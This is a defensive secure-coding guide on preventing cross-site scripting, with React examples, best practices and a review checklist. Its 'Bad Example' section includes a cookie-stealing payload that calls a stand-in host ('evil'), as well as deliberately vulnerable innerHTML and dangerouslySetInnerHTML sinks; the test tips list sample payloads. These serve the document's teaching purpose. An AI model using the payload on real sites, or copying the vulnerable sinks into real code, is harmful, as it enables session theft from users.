---
id: security/11-xss
topic: security
slug: xss
title: "XSS"
type: doc
order: 11
status: ready
tags: [security, xss]
related: [security/10-output-encoding, security/09-input-validation, security/20-csp, security/12-csrf]
when_to_use: "Read before rendering user-controlled data in a browser or building any HTML/DOM output."
---
# XSS (Cross-Site Scripting)

## Purpose

This document defines how to prevent Cross-Site Scripting: the injection of attacker-controlled
script into pages other users view. XSS lets an attacker run JavaScript in a victim's browser
in your origin's security context — reading cookies and tokens, making authenticated requests,
rewriting the page, and stealing input.

XSS is a specific application of [output encoding](10-output-encoding.md) to the browser. The
three classes are **stored** (payload persisted server-side), **reflected** (payload echoed
from the request), and **DOM-based** (payload flows into a dangerous sink entirely client-side).

## Why It Matters

An XSS payload executes with the full privileges of the logged-in user, in your origin. That
means it can do anything the user can: transfer funds, change email, exfiltrate session tokens
stored in `localStorage`, and pivot to other users (stored XSS is self-propagating). Because the
script runs *inside* your page, it bypasses same-origin protections and CSRF tokens — it simply
reads them. XSS is consistently in the OWASP Top 10 precisely because one unescaped sink can
compromise every visitor of a page, and the app looks completely normal while it happens.

## Core Principles

- **Escape on output, per context.** XSS is fixed at the point where data enters HTML, not at
  input. Encode for the exact sink: HTML body, attribute, JS, URL, or CSS
  (see [output encoding](10-output-encoding.md)).
- **Prefer safe sinks over dangerous ones.** Use `textContent` and framework interpolation
  (`{value}`), not `innerHTML`. The safe sink cannot execute markup by design.
- **Treat every dangerous-HTML API as a red flag.** `innerHTML`,
  `dangerouslySetInnerHTML`, `v-html`, `outerHTML`, `document.write`, and `eval` all reintroduce
  XSS. Each use must be justified and sanitized.
- **Sanitize rich HTML with a vetted allowlist library.** When users must submit formatted
  HTML, run it through DOMPurify (allowlist), never a hand-written filter.
- **Defense in depth, not a single wall.** Encoding is primary; a strict CSP, `HttpOnly`
  cookies, and Trusted Types contain the damage when encoding is missed.

## Best Practices

- Render user data through framework auto-escaping (`{value}` in React/JSX, `{{ value }}` in
  Vue/Angular). Leave it on; treat every bypass as a code-review event.
- For user-supplied HTML, sanitize with DOMPurify and an explicit allowlist of tags and
  attributes; strip `on*` handlers and `javascript:`/`data:` URLs.
- Guard DOM-based XSS: never pass `location`, `document.referrer`, `postMessage` data, or URL
  params into `innerHTML`, `eval`, `setTimeout(string)`, or `new Function`.
- Validate URL attributes: allow only `http:`/`https:` (and maybe `mailto:`); block
  `javascript:` in `href`/`src`. Encode values placed inside `<script>` or event handlers.
- Deploy a strict [Content Security Policy](20-csp.md) (nonce/hash-based, no `unsafe-inline`)
  so injected inline script does not run.
- Keep session tokens in `HttpOnly` cookies, not `localStorage`, so XSS cannot read them
  directly.
- Enable **Trusted Types** (`require-trusted-types-for 'script'`) to make dangerous DOM sinks
  fail unless passed a sanitized, typed value.

## Examples

**Good Example** — safe sink and allowlist sanitization

```tsx
// Framework interpolation auto-escapes: <script> renders as visible text, not markup.
function Comment({ text }: { text: string }) {
  return <p>{text}</p>; // safe by default
}

// Rich HTML that MUST render as markup is sanitized against an allowlist first.
import DOMPurify from "dompurify";
function RichBio({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, { ALLOWED_TAGS: ["b", "i", "a"], ALLOWED_ATTR: ["href"] });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />; // bypass is justified + sanitized
}
```

**Bad Example** — raw sink fed untrusted data

```tsx
// Stored XSS: attacker's <img src=x onerror=fetch('//evil/'+document.cookie) runs
// for every viewer of this comment.
function Comment({ text }: { text: string }) {
  return <p dangerouslySetInnerHTML={{ __html: text }} />; // no sanitization, dangerous sink
}

// DOM-based XSS: a URL param flows straight into a script-executing sink.
document.querySelector("#out").innerHTML = new URLSearchParams(location.search).get("q")!;
```

## Common Mistakes

- Assuming input validation prevents XSS; the fix is context-correct output encoding.
- Using `innerHTML` / `dangerouslySetInnerHTML` / `v-html` on untrusted data with no sanitizer.
- Sanitizing with a regex "strip `<script>`" that misses `onerror`, `<svg>`, and encodings.
- Ignoring DOM-based XSS: passing `location`/`postMessage`/params into dangerous sinks client-side.
- Allowing `javascript:` URLs in `href`/`src`.
- Storing tokens in `localStorage`, so any XSS becomes full session theft.
- Relying on CSP alone while leaving `unsafe-inline` enabled, which neuters it.

## Production Tips

- Add lint rules (e.g. `react/no-danger`, template `v-html` bans) so dangerous sinks require an
  explicit override that a reviewer sees.
- Report CSP violations to a collection endpoint; they surface injection attempts and missed
  escaping in production.
- Keep DOMPurify current; sanitizer bypasses are discovered and patched over time.
- In tests, feed known payloads (`<img onerror>`, `"><script>`, `javascript:` URLs) at every
  rendering sink and assert they render inert.

## AI Review Checklist

- Is all user data rendered through auto-escaping or a safe sink (`textContent`/`{value}`)?
- Is every dangerous-HTML API bypass justified and paired with allowlist sanitization?
- Are DOM sinks free of untrusted `location`/`params`/`postMessage`/`referrer` input?
- Are `href`/`src` URLs restricted to safe schemes (no `javascript:`)?
- Is a strict CSP (no `unsafe-inline`) deployed as defense-in-depth?
- Are session tokens in `HttpOnly` cookies rather than `localStorage`?
- Is rich HTML sanitized with a maintained allowlist library, not a regex?

## Related

- `knowledge/security/10-output-encoding.md`
- `knowledge/security/09-input-validation.md`
- `knowledge/security/20-csp.md`
- `knowledge/security/12-csrf.md`
